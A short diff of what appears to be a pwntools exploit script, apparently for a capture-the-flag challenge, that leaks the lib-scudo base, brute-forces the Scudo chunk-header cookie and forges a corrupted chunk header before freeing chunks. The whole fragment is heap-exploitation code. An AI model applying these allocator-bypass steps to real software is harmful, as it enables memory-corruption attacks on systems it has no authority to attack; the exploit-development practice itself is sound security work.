@@ -54,19 +54,18 @@ info(f"lib-scudo base: {hex(scudo_base)}")
 
 cookie_cheat = get_cookie_cheat(io, scudo_base)
 info(f"cheated cookie: {hex(cookie_cheat)}")
-cookie = bruteforce_cookie(io, add1)
-
-info(f"Bruteforced cookie: {hex(cookie)}")
+cookie = bruteforce_cookie(io, add2)
+info(f"bruteforced cookie: {hex(cookie)}")
 
 # mess with the chunk header at add2
 
-new_header = 0x8101
+new_header = 0x18101
 forged_header = forge_header(add2, cookie_cheat, new_header)
+forged_header = forge_header(add2, cookie, new_header)
+
 info("writing!!!!")
 write(io, add2-0x10, forged_header)
 
-
-io.interactive()
 
 free(io, add1)
 free(io, add2)
